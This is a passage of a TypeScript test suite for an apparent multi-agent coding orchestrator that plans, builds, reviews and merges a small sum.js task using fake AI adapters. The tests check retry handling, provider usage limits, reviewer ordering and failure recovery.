import { execFileSync } from 'node:child_process';
import { existsSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';
import type { ProviderId, RunRequest } from '../src/index.js';
import {
  Brain,
  activeLimits,
  FakeAdapter,
  Governor,
  Store,
  adapterMap,
  createProject,
  defaultRouting,
  plannerPrompt,
  shapePlan,
  calibration,
  changedLines,
  rankSeats,
  parseAssumptions,
  moveTask,
  placeTask,
  editTask,
  addTask,
  parseSteering,
  steer,
  applySteering,
  quietUntil,
  withPriors,
  routingInsights,
  seatStats,
  displayCommand,
  displayPath,
  answerQuestion,
  builderPlan,
  clarify,
  clarifyPrompt,
  countsAsAttempt,
  decidePermission,
  isRunnableInstall,
  parseClarify,
  parseQuestion,
  startDraft,
  effortUp,
  ensureIgnored,
  parsePlan,
  parseReview,
  providerProblems,
  retryFailed,
  retryTask,
  sameWork,
  skipTask,
} from '../src/index.js';
import { taskProgress, type LimitSettings } from '@conclave/shared';

const cleanup: string[] = [];
afterEach(() => {
  for (const d of cleanup.splice(0))
    rmSync(d, { recursive: true, force: true, maxRetries: 5, retryDelay: 200 });
});

const git = (cwd: string, ...args: string[]) =>
  execFileSync(
    'git',
    [
      '-c',
      'user.name=Test',
      '-c',
      'user.email=test@example.com',
      '-c',
      'core.autocrlf=false',
      ...args,
    ],
    {
      cwd,
      encoding: 'utf8',
    },
  ).trim();

/** A tiny repo whose test command checks that sum.js adds numbers. */
function makeRepo(): string {
  const repo = mkdtempSync(join(tmpdir(), 'conclave-repo-'));
  cleanup.push(repo);
  git(repo, 'init', '-q', '-b', 'main');
  writeFileSync(join(repo, 'README.md'), '# demo\n');
  writeFileSync(
    join(repo, 'check.js'),
    `const fs = require('fs');
if (!fs.existsSync('sum.js')) { console.error('sum.js is missing'); process.exit(1); }
const sum = require('./sum.js');
if (sum(2, 3) !== 5) { console.error('sum(2, 3) should be 5, got ' + sum(2, 3)); process.exit(1); }
console.log('ok');
`,
  );
  git(repo, 'add', '-A');
  git(repo, 'commit', '-q', '-m', 'init');
  return repo;
}

const writeSum = (body: string) => (req: RunRequest) => {
  writeFileSync(join(req.cwd, 'sum.js'), `module.exports = (a, b) => ${body};\n`);
};

const PLAN = JSON.stringify({
  done: false,
  tasks: [{ title: 'Add sum', spec: 'Create sum.js exporting (a, b) => a + b.' }],
});
const DONE = '```json\n{"done": true, "reason": "sum.js works"}\n```';
const APPROVE = '{"approve": true, "issues": [], "summary": "Looks right"}';

interface Setup {
  claude?: ConstructorParameters<typeof FakeAdapter>[0];
  codex?: ConstructorParameters<typeof FakeAdapter>[0];
  /** A third AI on the team, for tests that need another reviewer. */
  gemini?: ConstructorParameters<typeof FakeAdapter>[0];
  maxAttempts?: number;
  retryStrategy?: 'same' | 'escalate' | 'ask';
  askPolicy?: 'ask' | 'decide' | 'council';
  noTests?: boolean;
}

async function setup(opts: Setup = {}) {
  const repo = makeRepo();
  const home = mkdtempSync(join(tmpdir(), 'conclave-home-'));
  cleanup.push(home);
  const store = new Store(':memory:');
  let plans = 0;
  const claude = new FakeAdapter(
    opts.claude ?? {
      reply: (req) => (req.role === 'planner' ? (plans++ === 0 ? PLAN : DONE) : APPROVE),
    },
    { id: 'claude' },
  );
  const codex = new FakeAdapter(opts.codex ?? { reply: 'Created sum.js', act: writeSum('a + b') }, {
    id: 'codex',
    efforts: ['low', 'medium', 'high', 'xhigh'],
  });
  const gemini = opts.gemini ? new FakeAdapter(opts.gemini, { id: 'gemini' }) : undefined;
  const adapters = adapterMap([claude, codex, ...(gemini ? [gemini] : [])]);
  const ready = [
    { provider: 'claude' as ProviderId },
    { provider: 'codex' as ProviderId },
    ...(gemini ? [{ provider: 'gemini' as ProviderId }] : []),
  ];
  const project = await createProject(store, ready, {
    repoPath: repo,
    goal: 'Ship a working sum function',
    ...(!opts.noTests && { testCommand: 'node check.js' }),
    ...(opts.maxAttempts && { maxAttempts: opts.maxAttempts }),
    ...(opts.askPolicy && { askPolicy: opts.askPolicy }),
    ...(opts.retryStrategy && { retryStrategy: opts.retryStrategy }),
  });
  const brain = new Brain({ store, adapters, cwd: home }, project.id, { home });
  return { repo, home, store, claude, codex, gemini, project, brain };
}

describe('Brain', () => {
  it('plans, builds, tests, reviews and merges, then reports the goal met', async () => {
    const { repo, store, brain, project, claude, codex } = await setup();
    const outcome = await brain.run({ maxRounds: 10 });

    expect(outcome.kind).toBe('done');
    const tasks = store.projects.listTasks(project.id);
    expect(tasks.map((t) => [t.title, t.status, t.builtBy, t.reviewedBy])).toEqual([
      ['Add sum', 'merged', 'codex', 'claude'],
    ]);

    // The work is on the integration branch; the user's checkout is untouched.
    expect(git(repo, 'show', 'conclave/integration:sum.js')).toContain('a + b');
    expect(existsSync(join(repo, 'sum.js'))).toBe(false);
    expect(git(repo, 'rev-parse', '--abbrev-ref', 'HEAD')).toBe('main');
    expect(git(repo, 'log', '--oneline', 'main')).not.toContain('conclave');

    // Roles: Claude planned and reviewed (read-only), Codex built (may write).
    expect(codex.requests.map((r) => [r.role, r.readOnly])).toEqual([['builder', false]]);
    expect(claude.requests.map((r) => r.role)).toEqual(['planner', 'reviewer', 'planner']);
    expect(claude.requests[1]!.prompt).toContain('+module.exports = (a, b) => a + b;');

    expect(store.projects.get(project.id)?.status).toBe('done');
    const approvals = store.projects.approvals(project.id, 'pending');
    expect(approvals).toHaveLength(1);
    expect(approvals[0]?.kind).toBe('push');

    const kinds = store.projects.events(project.id).map((e) => e.kind);
    expect(kinds).toEqual(
      expect.arrayContaining([
        'start',
        'plan',
        'task',
        'commit',
        'verify',
        'review',
        'merge',
        'done',
        'approval',
      ]),
    );
  });

  it('sends failing work back with the test output, then merges the fix', async () => {
    let attempt = 0;
    const { store, brain, project, codex } = await setup({
      codex: {
        reply: 'done',
        act: (req) => writeSum(attempt++ === 0 ? 'a - b' : 'a + b')(req),
      },
    });
    const outcome = await brain.run({ maxRounds: 10 });

    expect(outcome.kind).toBe('done');
    const [task] = store.projects.listTasks(project.id);
    expect(task?.status).toBe('merged');
    expect(task?.attempts).toBe(1);
    expect(codex.requests[1]!.prompt).toContain('THE PREVIOUS ATTEMPT WAS SENT BACK');
    expect(codex.requests[1]!.prompt).toContain('sum(2, 3) should be 5, got -1');
  });

  it('passes reviewer issues to the next attempt', async () => {
    let plans = 0;
    let reviews = 0;
    const { store, brain, project, codex } = await setup({
      claude: {
        reply: (req) =>
          req.role === 'planner'
            ? plans++ === 0
              ? PLAN
              : DONE
            : reviews++ === 0
              ? '{"approve": false, "issues": ["Add a comment explaining sum"], "summary": "Almost"}'
              : APPROVE,
      },
    });
    await brain.run({ maxRounds: 10 });
    expect(store.projects.listTasks(project.id)[0]?.status).toBe('merged');
    expect(codex.requests[1]!.prompt).toContain('Add a comment explaining sum');
  });

  it('gives up on a task after maxAttempts and keeps going', async () => {
    const { store, brain, project } = await setup({
      codex: { reply: 'done', act: writeSum('a * b') },
      maxAttempts: 2,
    });
    const outcomes = [];
    for (let i = 0; i < 3; i++) outcomes.push((await brain.round()).kind);
    expect(outcomes).toEqual(['planned', 'retry', 'failed']);
    const [task] = store.projects.listTasks(project.id);
    expect(task?.status).toBe('failed');
    expect(task?.feedback).toContain('should be 5, got 6');
  });

  it('pauses instead of re-planning work that already failed', async () => {
    const { store, brain, project } = await setup({
      codex: { reply: 'done', act: writeSum('a * b') },
      claude: { reply: (req) => (req.role === 'planner' ? PLAN : APPROVE) },
      maxAttempts: 1,
    });
    const outcome = await brain.run({ maxRounds: 20 });
    expect(outcome).toMatchObject({
      kind: 'idle',
      reason: expect.stringContaining('already failed'),
    });
    expect(store.projects.listTasks(project.id)).toHaveLength(1);
    expect(store.projects.get(project.id)?.status).toBe('paused');
  });

  it('pauses after several tasks in a row fail', async () => {
    let n = 0;
    const { store, brain, project } = await setup({
      codex: { reply: 'done', act: writeSum('a * b') },
      claude: {
        reply: (req) =>
          req.role === 'planner'
            ? JSON.stringify({
                done: false,
                tasks: [{ title: `Try ${++n}`, spec: 'Create sum.js' }],
              })
            : APPROVE,
      },
      maxAttempts: 1,
    });
    const outcome = await brain.run({ maxRounds: 20 });
    expect(outcome).toMatchObject({
      kind: 'idle',
      reason: expect.stringContaining('3 tasks in a row failed'),
    });
    expect(store.projects.listTasks(project.id).map((t) => t.status)).toEqual([
      'failed',
      'failed',
      'failed',
    ]);
  });

  it('routes building to the next provider when one hits its usage limit', async () => {
    let plans = 0;
    const { store, brain, project, claude, codex } = await setup({
      codex: {
        reply: '',
        limitWhen: () => ({ message: 'Codex weekly limit', resetsAt: Date.now() + 3_600_000 }),
      },
      claude: {
        reply: (req) =>
          req.role === 'planner'
            ? plans++ === 0
              ? PLAN
              : DONE
            : req.role === 'builder'
              ? 'built'
              : APPROVE,
        act: (req) => {
          if (req.role === 'builder') writeSum('a + b')(req);
        },
      },
    });
    const outcome = await brain.run({ maxRounds: 4, sleep: async () => undefined });
    expect(codex.requests).toHaveLength(1);
    expect(claude.requests.map((r) => r.role)).toContain('builder');
    const [task] = store.projects.listTasks(project.id);
    expect(task?.builtBy).toBe('claude');
    // Claude built it, so Claude may not review it: the task waits for Codex instead.
    expect(claude.requests.map((r) => r.role)).not.toContain('reviewer');
    expect(outcome.kind).toBe('waiting');
    expect(task?.status).toBe('queued');
    expect(
      store.projects
        .events(project.id)
        .some((e) => /No reviewer has headroom \(codex: Codex weekly limit\)/.test(e.message)),
    ).toBe(true);
  });

  it('lets the builder review only when the team has no other reviewer', async () => {
    const { store, brain, project, codex } = await setup({
      codex: {
        reply: (req) => (req.role === 'reviewer' ? APPROVE : 'Created sum.js'),
        act: writeSum('a + b'),
      },
    });
    store.projects.update(project.id, {
      routing: { ...project.routing, reviewer: [{ provider: 'codex' }] },
    });
    expect((await brain.run({ maxRounds: 10 })).kind).toBe('done');
    expect(codex.requests.map((r) => r.role)).toEqual(['builder', 'reviewer']);
    expect(
      store.projects
        .events(project.id)
        .some((e) => e.message.includes('the only reviewer on this team')),
    ).toBe(true);
  });

  it('moves work to the next builder when one hits a spend cap, without charging attempts', async () => {
    let plans = 0;
    const { store, brain, project } = await setup({
      codex: { reply: '', fail: 'You hit your spend cap set by the owner of your workspace.' },
      gemini: { reply: APPROVE },
      claude: {
        reply: (req) =>
          req.role === 'planner'
            ? plans++ === 0
              ? PLAN
              : DONE
            : req.role === 'builder'
              ? 'built'
              : APPROVE,
        act: (req) => {
          if (req.role === 'builder') writeSum('a + b')(req);
        },
      },
    });
    expect((await brain.run({ maxRounds: 10 })).kind).toBe('done');
    const [task] = store.projects.listTasks(project.id);
    // Claude built it, so the other free AI reviewed it, never Claude itself.
    expect(task).toMatchObject({
      status: 'merged',
      builtBy: 'claude',
      reviewedBy: 'gemini',
      attempts: 0,
    });
    // Nothing failed, so the banner comes from the limit itself, until Codex works again.
    expect(activeLimits(store, project.id)).toEqual([
      expect.objectContaining({ provider: 'codex', message: expect.stringContaining('spend cap') }),
    ]);
    store.usage.record({
      seat: { provider: 'codex' },
      role: 'chat',
      source: 'chat',
      result: { ok: true, usage: {}, durationMs: 1 },
    });
    expect(activeLimits(store, project.id)).toEqual([]);
  });

  it('waits until the earliest reset when every provider is out of headroom', async () => {
    const { store, project } = await setup();
    const resetsAt = Date.now() + 2 * 3_600_000;
    for (const provider of ['claude', 'codex'] as const) {
      store.recordQuota({
        provider,
        window: 'five_hour',
        utilization: 0.97,
        resetsAt,
        at: Date.now(),
      });
    }
    const brain = new Brain({ store, adapters: adapterMap([]), cwd: '.' }, project.id, {
      home: mkdtempSync(join(tmpdir(), 'conclave-home-')),
    });
    const slept: number[] = [];
    const outcome = await brain.run({ maxRounds: 2, sleep: async (ms) => void slept.push(ms) });
    expect(outcome).toMatchObject({ kind: 'waiting', until: resetsAt });
    expect(slept).toHaveLength(2);
    expect(slept[0]).toBeGreaterThan(29 * 60_000); // capped at 30 minutes per nap
    expect(store.projects.get(project.id)?.status).toBe('running');
  });

  it('puts interrupted tasks back in the queue on restart', async () => {
    const { store, brain, project, home } = await setup();
    await brain.round(); // plan
    const [task] = store.projects.listTasks(project.id);
    store.projects.updateTask(task!.id, { status: 'building' }); // as if the app crashed mid-build

    const restarted = new Brain(
      {
        store,
        adapters: adapterMap([
          new FakeAdapter({ reply: APPROVE }, { id: 'claude' }),
          new FakeAdapter({ reply: 'x', act: writeSum('a + b') }, { id: 'codex' }),
        ]),
        cwd: home,
      },
      project.id,
      { home },
    );
    await restarted.start();
    expect(store.projects.getTask(task!.id)?.status).toBe('queued');
    expect(store.projects.events(project.id).at(-1)?.message).toContain('1 interrupted task');
    expect((await restarted.round()).kind).toBe('merged');
  });

  it('stops when the project is stopped', async () => {
    const { store, brain, project } = await setup();
    await brain.round();
    brain.stop('Stopped by you');
    expect(await brain.round()).toEqual({ kind: 'stopped', reason: 'Stopped by you' });
    expect(store.projects.get(project.id)?.status).toBe('stopped');
  });

  it('sends back an attempt that changed nothing', async () => {
    const { brain } = await setup({ codex: { reply: 'Nothing to do' } });
    await brain.round();
    const outcome = await brain.round();
    expect(outcome).toMatchObject({
      kind: 'retry',
      reason: 'Codex finished without changing any files',
    });
  });

  it('refuses a folder that is not a git repository', async () => {
    const dir = mkdtempSync(join(tmpdir(), 'conclave-norepo-'));
    cleanup.push(dir);
    await expect(
      createProject(new Store(':memory:'), [{ provider: 'claude' }], { repoPath: dir, goal: 'x' }),
    ).rejects.toThrow(/not a git repository/);
  });

  it('sizes the plan to the goal and folds test setup into the first task', async () => {
    const { project } = await setup();
    const ctx = {
      files: [],
      totalFiles: 0,
      history: '',
      merged: [],
      failed: [],
      skipped: [],
      queued: [],
      maxTasks: 5,
    };
    const prompt = plannerPrompt({ ...project, testCommand: null, proposedTestCommand: null }, ctx);
    expect(prompt).toMatch(/a small goal .* is ONE task/);
    expect(prompt).toMatch(/sets them up along with its own change/);
    expect(prompt).not.toMatch(/Make setting them up the first task/);
  });

  it('keeps the default team order until measured data says otherwise', () => {
    const ready = (['antigravity', 'codex', 'claude'] as ProviderId[]).map((provider) => ({
      provider,
    }));
    const team = defaultRouting(ready).reviewer;
    expect(team.map((s) => s.provider)).toEqual(['claude', 'antigravity', 'codex']);
    const order = (stats: Parameters<typeof rankSeats>[2], used: Record<string, number> = {}) =>
      rankSeats(team, 'reviewer', stats, (p) => used[p] ?? null);
    const stat = (runs: number, okRate: number, medianMs: number) => ({ runs, okRate, medianMs });

    // No data, or too little: the team order stands.
    expect(order(new Map()).seats).toEqual(team);
    expect(
      order(
        new Map([
          ['antigravity', stat(3, 1, 90_000)],
          ['codex', stat(3, 1, 10_000)],
        ]),
      ).reasons,
    ).toEqual([]);

    // A reviewer at least 2x slower than the fastest moves behind it.
    const slow = order(
      new Map([
        ['claude', stat(8, 1, 20_000)],
        ['antigravity', stat(8, 1, 70_000)],
        ['codex', stat(8, 1, 25_000)],
      ]),
    );
    expect(slow.seats.map((s) => s.provider)).toEqual(['claude', 'codex', 'antigravity']);
    expect(slow.reasons[0]).toBe(
      'Antigravity reviews take about 1.2 min (Claude about 20 s) here, so faster reviewers go first',
    );

    // Unreliable or nearly spent providers move back, the unreliable one furthest.
    const mixed = order(new Map([['claude', stat(10, 0.5, 20_000)]]), { antigravity: 0.8 });
    expect(mixed.seats.map((s) => s.provider)).toEqual(['codex', 'antigravity', 'claude']);

    // Builders keep their order for speed; only reliability and quota move them.
    const builders = rankSeats(
      team,
      'builder',
      new Map([
        ['antigravity', stat(8, 1, 90_000)],
        ['claude', stat(8, 1, 1_000)],
      ]),
      () => null,
    );
    expect(builders.seats).toEqual(team);
  });

  it('starts from the benchmark priors, which fade as real runs come in', () => {
    const team = (['claude', 'antigravity', 'codex'] as ProviderId[]).map((provider) => ({
      provider,
    }));
    const rev = ['antigravity', 'claude', 'codex'].map((provider) => ({ provider })) as typeof team;
    // A fresh install: Antigravity's slow reviews are known from the benchmark.
    const fresh = rankSeats(rev, 'reviewer', withPriors('reviewer', new Map()), () => null);
    expect(fresh.seats.map((s) => s.provider)).toEqual(['claude', 'codex', 'antigravity']);
    expect(fresh.reasons[0]).toBe(
      "Antigravity reviews take about 2.8 min (Claude about 18 s) in Conclave's benchmarks, so faster reviewers go first",
    );
    // Five fast Antigravity reviews here outweigh the prior.
    const fast = new Map([['antigravity' as ProviderId, { runs: 5, okRate: 1, medianMs: 15_000 }]]);
    expect(rankSeats(rev, 'reviewer', withPriors('reviewer', fast), () => null).seats).toEqual(rev);
    // No priors for building: builders keep your order.
    expect(rankSeats(team, 'builder', withPriors('builder', new Map()), () => null).seats).toEqual(
      team,
    );
    // The team screen gets the same reasons.
    const insights = routingInsights(
      { planner: team, builder: team, reviewer: rev },
      () => [],
      () => null,
    );
    expect(insights.reviewer.reasons).toEqual(fresh.reasons);
    expect(insights.builder.reasons).toEqual([]);
  });

  it('keeps your own order when the project turns adaptive ordering off', async () => {
    const { store, brain, claude, project } = await setup();
    store.projects.update(project.id, { adaptiveTeam: false });
    for (let i = 0; i < 6; i++)
      store.usage.record({
        seat: { provider: 'claude' },
        role: 'planner',
        source: 'project',
        result: { ok: false, durationMs: 1, usage: {} },
      });
    await brain.run({ maxRounds: 10 });
    expect(claude.requests[0]!.role).toBe('planner');
    expect(
      store.projects.events(project.id).some((e) => e.message.includes('order adjusted')),
    ).toBe(false);
  });

  it('keeps a provider at a spend cap out for the longest backoff straight away', () => {
    let now = 0;
    const g = new Governor(() => [], {
      now: () => now,
      baseBackoffMs: 5 * 60_000,
      maxBackoffMs: 60 * 60_000,
    });
    g.observe('codex', {
      ok: false,
      rateLimited: { message: 'You hit your spend cap set by the owner of your workspace.' },
    } as never);
    now = 30 * 60_000;
    expect(g.availability('codex').ok).toBe(false);
    now = 61 * 60_000;
    expect(g.availability('codex').ok).toBe(true);
    // An ordinary limit with no reset time still starts short.
    g.observe('claude', { ok: false, rateLimited: { message: 'rate limited' } } as never);
    now += 6 * 60_000;
    expect(g.availability('claude').ok).toBe(true);
  });

  it('counts recent runs per provider for ranking', () => {
    const runs = [
      { provider: 'codex' as ProviderId, ok: true, durationMs: 30 },
      { provider: 'codex' as ProviderId, ok: false, durationMs: 5 },
      { provider: 'codex' as ProviderId, ok: true, durationMs: 10 },
      { provider: 'claude' as ProviderId, ok: true, durationMs: 7 },
    ];
    expect(seatStats(runs).get('codex')).toEqual({ runs: 3, okRate: 2 / 3, medianMs: 20 });
    expect(seatStats(runs, 1).get('codex')).toEqual({ runs: 1, okRate: 1, medianMs: 30 });
  });

  it('reviews with a faster reviewer once runs show the first choice is much slower', async () => {
    const { store, brain, claude, codex, gemini, project } = await setup({
      gemini: { reply: APPROVE },
    });
    store.projects.update(project.id, {
      routing: {
        ...project.routing,
        builder: [{ provider: 'codex' }],
        reviewer: [{ provider: 'claude' }, { provider: 'codex' }, { provider: 'gemini' }],
      },
    });
    // Claude has been a slow reviewer lately; Gemini a fast one.
    for (let i = 0; i < 6; i++) {
      for (const [provider, durationMs] of [
        ['claude', 90_000],
        ['gemini', 9_000],
      ] as const)
        store.usage.record({
          seat: { provider },
          role: 'reviewer',
          source: 'project',
          result: { ok: true, durationMs, usage: {} },
        });
    }
    await brain.run({ maxRounds: 10 });
    const notes = store.projects.events(project.id).map((e) => e.message);
    expect(notes).toContainEqual(
      expect.stringMatching(
        /^Reviewer order adjusted: Claude reviews take about 1\.5 min \(Gemini about 9 s\) here/,
      ),
    );
    expect(gemini!.requests.map((r) => r.role)).toEqual(['reviewer']);
    expect(claude.requests.map((r) => r.role)).not.toContain('reviewer');
    // Codex built, so it never reviews its own work, whatever the ranking says.
    expect(codex.requests.map((r) => r.role)).toEqual(['builder']);
  });

  it('keeps the merged result readable from the integration worktree', async () => {
    const { home, project, brain } = await setup();
    await brain.run({ maxRounds: 10 });
    const integration = join(home, 'projects', project.id, 'integration', 'sum.js');
    expect(readFileSync(integration, 'utf8')).toContain('a + b');
  });
});

describe('Failure recovery', () => {
  it('records what kind of failure stopped an attempt, and whose problem it was', async () => {
    const { store, brain, project } = await setup({
      codex: { reply: 'done', act: writeSum('a * b') },
      maxAttempts: 1,
    });
    await brain.round();
    await brain.round();
    const [task] = store.projects.listTasks(project.id);
    expect(task).toMatchObject({ status: 'failed', attempts: 1 });
    expect(task?.lastFailure).toMatchObject({
      kind: 'tests',
      summary: 'The tests failed (exit 1)',
      provider: 'codex',
    });
    expect(task?.lastFailure?.detail).toContain('should be 5, got 6');
  });

  it('gives a CLI crash one free retry before it counts', async () => {
    let builds = 0;
    const { store, brain, project } = await setup({
      codex: {
        reply: 'done',
        act: writeSum('a + b'),
        failWhen: (req) =>
          req.role === 'builder' && builds++ === 0 ? 'socket hang up' : undefined,
      },
      maxAttempts: 1,
    });
    expect((await brain.run({ maxRounds: 10 })).kind).toBe('done');
    const [task] = store.projects.listTasks(project.id);
    expect(task).toMatchObject({ status: 'merged', attempts: 0, freeRetries: 1 });
    expect(
      store.projects
        .events(project.id)
        .some((e) => e.message.includes('not counted as an attempt')),
    ).toBe(true);
  });

  it('never counts a usage limit, gives conflicts two free rebuilds and crashes one', () => {
    expect(countsAsAttempt('limit', 0)).toBe(false);
    expect(countsAsAttempt('limit', 9)).toBe(false);
    expect(countsAsAttempt('conflict', 0)).toBe(false);
    expect(countsAsAttempt('conflict', 1)).toBe(false);
    expect(countsAsAttempt('conflict', 2)).toBe(true);
    expect(countsAsAttempt('crash', 0)).toBe(false);
    expect(countsAsAttempt('crash', 1)).toBe(true);
    expect(countsAsAttempt('tests', 0)).toBe(true);
    expect(countsAsAttempt('review', 0)).toBe(true);
    expect(countsAsAttempt('no_changes', 0)).toBe(true);
  });

  it('raises effort on attempt 2 and switches builder on attempt 3 when escalating', async () => {
    const { store, brain, project, codex, claude } = await setup({
      codex: { reply: 'done', act: writeSum('a * b') },
      claude: {
        reply: (req) =>
          req.role === 'planner' ? PLAN : req.role === 'builder' ? 'built' : APPROVE,
        act: (req) => {
          if (req.role === 'builder') writeSum('a * b')(req);
        },
      },
      maxAttempts: 3,
    });
    expect(store.projects.get(project.id)?.retryStrategy).toBe('escalate');
    store.projects.update(project.id, {
      routing: { ...project.routing, builder: [{ provider: 'codex' }, { provider: 'claude' }] },
    });
    for (let i = 0; i < 4; i++) await brain.round();
    const builds = [
      ...codex.requests.filter((r) => r.role === 'builder').map((r) => `codex@${r.effort ?? '-'}`),
      ...claude.requests
        .filter((r) => r.role === 'builder')
        .map((r) => `claude@${r.effort ?? '-'}`),
    ];
    expect(builds).toEqual(['codex@-', 'codex@high', 'claude@high']);
    const log = store.projects.events(project.id).map((e) => e.message);
    expect(log.some((m) => m.includes('Attempt 3') && m.includes('switching to Claude'))).toBe(
      true,
    );
  });

  it('keeps the same team with the "same" strategy', () => {
    const project = {
      routing: { builder: [{ provider: 'codex' }, { provider: 'claude' }] },
      retryStrategy: 'same',
    } as never;
    const task = { attempts: 2, builtBy: 'codex', pinnedSeat: null } as never;
    expect(builderPlan(project, task, new Map()).seats.map((s) => s.provider)).toEqual([
      'codex',
      'claude',
    ]);
  });

  it('steps effort up within what the provider supports', () => {
    expect(effortUp(undefined, ['low', 'medium', 'high'])).toBe('high');
    expect(effortUp('high', ['low', 'medium', 'high'])).toBe('high');
    expect(effortUp('high', undefined)).toBe('xhigh');
    expect(effortUp('xhigh', undefined, 'xhigh')).toBe('xhigh');
    expect(effortUp('low', ['low', 'medium'])).toBe('medium');
  });

  it('retries a failed task with a pinned seat and fresh attempts, for that task only', async () => {
    let plans = 0;
    const { store, brain, project, claude } = await setup({
      codex: {
        reply: (req) => (req.role === 'reviewer' ? APPROVE : 'done'),
        act: (req) => {
          if (req.role === 'builder') writeSum('a * b')(req);
        },
      },
      claude: {
        reply: (req) =>
          req.role === 'planner'
            ? plans++ === 0
              ? JSON.stringify({
                  done: false,
                  tasks: [
                    { title: 'Add sum', spec: 'Create sum.js' },
                    { title: 'Document it', spec: 'Add a README line' },
                  ],
                })
              : DONE
            : req.role === 'builder'
              ? 'built'
              : APPROVE,
        act: (req) => {
          if (req.role === 'builder') writeSum('a + b')(req);
        },
      },
      maxAttempts: 1,
    });
    await brain.round(); // plan
    await brain.round(); // Add sum fails on Codex
    const [first, second] = store.projects.listTasks(project.id);
    expect(first?.status).toBe('failed');

    const retried = retryTask(store.projects, first!.id, {
      seat: { provider: 'claude', effort: 'high' },
    });
    expect(retried).toMatchObject({
      status: 'queued',
      attempts: 0,
      pinnedSeat: { provider: 'claude' },
    });
    await brain.round();
    expect(store.projects.getTask(first!.id)?.status).toBe('merged');
    const build = claude.requests.find((r) => r.role === 'builder');
    expect(build?.effort).toBe('high');
    expect(store.projects.getTask(second!.id)?.pinnedSeat).toBeNull();
  });

  it('skips a task so it leaves the progress total', async () => {
    const { store, brain, project } = await setup({
      codex: { reply: 'done', act: writeSum('a * b') },
      maxAttempts: 1,
    });
    await brain.round();
    await brain.round();
    const [task] = store.projects.listTasks(project.id);
    expect(taskProgress(store.projects.listTasks(project.id))).toMatchObject({
      total: 1,
      failed: 1,
    });
    skipTask(store.projects, task!.id);
    expect(taskProgress(store.projects.listTasks(project.id))).toMatchObject({
      total: 0,
      failed: 0,
      skipped: 1,
    });
    expect(() => skipTask(store.projects, task!.id)).toThrow(/Only failed/);
  });

  it('finds a provider causing repeated failures and retries them all with another AI', async () => {
    const { store, project } = await setup();
    const tasks = store.projects.addTasks(project.id, [
      { title: 'One', spec: 'x' },
      { title: 'Two', spec: 'x' },
      { title: 'Three', spec: 'x' },
    ]);
    const crash = {
      kind: 'crash' as const,
      summary: 'Codex stopped with an error',
      detail: 'boom',
      provider: 'codex' as const,
      model: null,
      at: 1,
    };
    for (const t of tasks.slice(0, 2)) {
      store.projects.updateTask(t.id, { status: 'failed', attempts: 3, lastFailure: crash });
    }
    const problems = providerProblems(store.projects.listTasks(project.id));
    expect(problems).toHaveLength(1);
    expect(problems[0]).toMatchObject({ provider: 'codex', kind: 'crash' });
    expect(problems[0]?.tasks).toHaveLength(2);

    const retried = retryFailed(
      store.projects,
      project.id,
      { provider: 'codex' },
      { seat: { provider: 'claude' } },
    );
    expect(retried.map((t) => [t.title, t.status, t.pinnedSeat?.provider])).toEqual([
      ['One', 'queued', 'claude'],
      ['Two', 'queued', 'claude'],
    ]);
  });
});

describe('Reviewers that give no verdict', () => {
  it('asks the next reviewer instead of charging the task', async () => {
    let plans = 0;
    const { store, brain, project, codex, gemini } = await setup({
      claude: {
        reply: (req) => (req.role === 'planner' ? (plans++ === 0 ? PLAN : DONE) : ''),
      },
      gemini: { reply: APPROVE },
    });
    store.projects.update(project.id, {
      routing: {
        ...project.routing,
        builder: [{ provider: 'codex' }],
        reviewer: [{ provider: 'claude' }, { provider: 'codex' }, { provider: 'gemini' }],
      },
    });
    expect((await brain.run({ maxRounds: 10 })).kind).toBe('done');
    expect(store.projects.listTasks(project.id)[0]).toMatchObject({
      status: 'merged',
      attempts: 0,
      reviewedBy: 'gemini',
    });
    // Codex built it, so it was skipped as a reviewer even though it was next in line.
    expect(codex.requests.some((r) => r.role === 'reviewer')).toBe(false);
    expect(gemini!.requests.some((r) => r.role === 'reviewer')).toBe(true);
    expect(
      store.projects
        .events(project.id)
        .some(
          (e) =>
            e.message.includes('replied without a verdict') &&
            e.message.includes('asking another reviewer'),
        ),
    ).toBe(true);
  });
});

describe('One piece of work, one task', () => {
  it('lets the planner take over a failed task by id, so the total does not grow', async () => {
    let plans = 0;
    let failedId = '';
    const { store, brain, project, claude } = await setup({
      codex: {
        reply: 'done',
        act: (req) => writeSum(req.prompt.includes('YOUR TASK: Add sum') ? 'a * b' : 'a + b')(req),
      },
      claude: {
        reply: (req) => {
          if (req.role !== 'planner') return APPROVE;
          plans++;
          if (plans === 1) return PLAN;
          if (plans === 2) {
            failedId = /- (k_\w+): Add sum/.exec(req.prompt)?.[1] ?? '';
            return JSON.stringify({
              done: false,
              tasks: [
                { title: 'Write sum.js from scratch', spec: 'Create sum.js', replaces: failedId },
              ],
            });
          }
          return DONE;
        },
      },
      maxAttempts: 1,
    });
    expect((await brain.run({ maxRounds: 10 })).kind).toBe('done');
    expect(failedId).toMatch(/^k_/);
    expect(claude.requests.filter((r) => r.role === 'planner')[1]?.prompt).toContain('"replaces"');
    const tasks = store.projects.listTasks(project.id);
    expect(tasks.map((t) => [t.title, t.status])).toEqual([
      ['Add sum', 'replaced'],
      ['Write sum.js from scratch', 'merged'],
    ]);
    expect(tasks[0]?.replacedBy).toBe(tasks[1]?.id);
    expect(taskProgress(tasks)).toMatchObject({ merged: 1, total: 1, failed: 0 });
  });

  it('links a re-proposal with a clearly similar title even without "replaces"', () => {
    expect(
      sameWork(
        'Add particle burst and screen shake on every button press',
        'Add particle burst on every press in fx.js',
      ),
    ).toBe(true);
    expect(
      sameWork(
        'Add combo counter with escalating effects and sound-free juice',
        'Add combo counter with timed decay and escalating tiers',
      ),
    ).toBe(true);
    expect(sameWork('Add tests for parser', 'Add tests for lexer')).toBe(false);
    expect(
      sameWork('Add fx.js hook called on every button activation', 'Add keyboard support'),
    ).toBe(false);
  });
});

const QUESTION = JSON.stringify({
  question: 'Should sum accept strings?',
  why: 'Changes the signature',
  options: ['Numbers only', 'Coerce strings'],
  recommended: 'Numbers only',
});

describe('Questions and decisions', () => {
  it('files a question, waits for you, then builds with your answer', async () => {
    let n = 0;
    const { store, brain, project, codex } = await setup({
      codex: {
        reply: () => (n++ === 0 ? QUESTION : 'Created sum.js'),
        act: (req) => {
          if (n > 0) writeSum('a + b')(req);
        },
      },
    });
    await brain.round(); // plan
    const asked = await brain.round();
    expect(asked).toMatchObject({ kind: 'asked', decided: false });
    const [task] = store.projects.listTasks(project.id);
